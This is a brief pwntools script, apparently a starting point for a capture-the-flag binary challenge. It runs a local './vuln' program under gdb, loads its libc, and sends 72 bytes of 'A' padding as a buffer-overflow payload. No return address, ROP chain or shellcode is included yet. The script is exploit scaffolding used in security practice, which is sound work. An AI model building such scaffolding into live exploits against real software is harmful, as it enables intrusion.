#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./vuln')
e=ELF('./vuln')
libc=ELF('./libc.so.6')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
gdb.attach(p)

ru(b"challenge\n")

payload = b''
payload += b'A'*72

sla(b"Enter your payload below\n",payload)

p.interactive()
